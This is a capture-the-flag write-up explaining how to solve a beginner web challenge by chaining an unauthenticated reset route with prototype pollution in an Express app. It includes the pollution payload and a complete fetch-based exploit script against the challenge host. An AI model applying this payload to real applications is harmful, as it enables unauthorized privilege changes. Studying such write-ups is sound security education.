# Worse than SQLi

| 📁 Category | 👨‍💻 Creator | 📝 Writeup By                           |
| ----------- | ---------- | --------------------------------------- |
| Web (Easy)  | bhavya_32  | [Vexcited](https://github.com/Vexcited) |

> Just a beginner friendly web chall.

## Solution

We're starting with the source code of an Express app made with Node.js, no TypeScript.

We have multiple routes.

- `POST /register`: creates a new user
- `POST /login`: login with an existing user
- `GET /profile`: display our profile
- `POST /update`: update our profile name or bio
- `GET /getFlag`: displays the flag
- `POST /resetAll`: resets the instance

An interesting route is `GET /getFlag` since it is what we want.

```javascript
if (config["allowFetchingFlag"] == "Yes") {
  return res.send(`<h2>Flag: ${FLAG}</h2>`);
}

res.send("<h2>No flag for you!</h2>");
```

Sadly, the flag is protected behind `config.allowFetchingFlag`.
Here's the default values for the `config`.

```javascript
const config = {
  allowFetchingFlag: "No",
  adminPass: crypto.randomBytes(16).toString("hex"),
};
```

---

After a bit of investigating, the `POST /resetAll` route clears all keys of the `config` object but is NOT recreating the `allowFetchingFlag` key, leaving it to `undefined`.

```javascript
if (req.query.adminpass !== config["adminPas"]) {
  return res.status(403).send("Forbidden");
}
for (const key in users) {
  delete users[key];
}
usernames.clear();
for (const key in config) {
  delete config[key];
}

config["adminPass"] = crypto.randomBytes(16).toString("hex");
res.send("All users and config reset");
```

There's also a missing letter on the property `adminPas`.
This let anyone run this route without any verification because leaving `adminpass` empty would make it `undefined` and since `adminPas` does not exist, it is also `undefined`. The equality is always `false`!

Not sure what we can do with this for now, but let's write it down!

### Prototype Pollution

The only interesting feature in this challenge is updating our bio and profile name so let's take a deeper look on how it is implemented.

```javascript
const { key, value } = req.body;

try {
  if (!["name", "bio"].includes(key)) {
    throw new Error("Invalid key");
  }

  if (value.length > 10) {
    return res.render("profile", {
      user: users[req.session.username],
      username: req.session.username,
      error: "Sorry, memory issues.",
      success: null,
    });
  }
} catch (error) {
  res.send("Invalid key provided.");
}

if (typeof key === "string") {
  users[req.session.username][key] = value;
} else {
  for (const k in key) {
    for (const v in value) {
      users[req.session.username][key[k]][v] = value[v];
      console.log(config.allowFetchingFlag);
    }
  }
}

return res.render("profile", {
  user: users[req.session.username],
  username: req.session.username,
  error: null,
  success: "Profile updated!",
});
```

Let's break it down.

```javascript
if (!["name", "bio"].includes(key)) {
  throw new Error("Invalid key");
}
```

If the `key` value is not `name` or `bio`, it throws `Invalid key`. The error thrown is then catched below.

```javascript
catch (error) {
  res.send("Invalid key provided.");
}
```

Sadly, there's a catch : it is not doing any early return. `res.send` is not stopping the execution of the function so let's continue iterate by keeping in head we can actualy have whatever we want.

```javascript
if (typeof key === "string") {
  users[req.session.username][key] = value;
} else {
  for (const k in key) {
    for (const v in value) {
      users[req.session.username][key[k]][v] = value[v];
    }
  }
}
```

Do you see it? Yes! Prototype Pollution!
If our `key` is not a string and if we control `key[k]`, `v` and `value[v]`, we're able to override the object's prototype and re-assign globally `allowFetchingFlag` to `Yes` (after the `POST /resetAll` call)

Typically, calling `users[req.session.username]["__proto__"]["allowFetchingFlag"] = "Yes"` would be enough!

### Building a payload

At the beginning of the server, we can find the following statement.

```javascript
app.use(express.urlencoded());
```

That means we're able to do some magics with our body.

By doing `key=h1&key=h2`, `key` is no longer a string but an array of strings: `key: ["h1", "h2"]`.

Let's control `key[k]` by doing `key=__proto__&key=__proto__`.
We now have `key: ["__proto__", "__proto__"]` which is iterable. It'll end up to `users[req.session.username]["__proto__"]`.

By doing `value[property]=value` we can create an object: `value: { property: "value" }`.

Let's control `v` and `value[v]` by doing `value[allowFetchingFlag]=Yes`. Here, `v` is `allowFetchingFlag` and thus `value[v]` is `Yes`.

By combining all of these, we get our the final payload.

```
key=__proto__&key=__proto__&value[allowFetchingFlag]=Yes
```

### Flagging

We can now put this all together in a single script to retrieve our flag.

```typescript
const url = "http://0f6a305cfd.ctf.0bscuri7y.xyz";

// 1. Delete all keys in configuration.
//    Also retrieve the session cookie.
let r = await fetch(url + "/resetAll", { method: "POST", redirect: "manual" });
let c = r.headers.getSetCookie()[0].split("; ")[0];

// 2. Create a new account using random credentials.
let id = crypto.randomUUID();
r = await fetch(url + "/register", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
    cookie: c,
  },
  body: "username=" + id + "&password=" + id,
  method: "POST",
  redirect: "manual",
});

// 3. Get our new cookie since session has been updated.
c = r.headers.getSetCookie()[0].split("; ")[0];

// 4. Exploit the prototype pollution by updating our profile.
r = await fetch(url + "/update", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
    cookie: c,
  },
  body: "key=__proto__&key=__proto__&value[allowFetchingFlag]=Yes",
  redirect: "manual",
  method: "POST",
});

// 5. `config.allowFetchingFlag` is now enabled, we can get our flag.
r = await fetch(url + "/getFlag", {
  redirect: "manual",
  headers: { cookie: c },
});

// Display our flag!
const f = await r.text();
console.log(f);
```

```sh
$ bun run exploit.mts
<h2>Flag: 07CTF{i_wISH_1_hAd_ChEcks_fOr_pROTOType_pO11U7ION}</h2>
```

Solved!
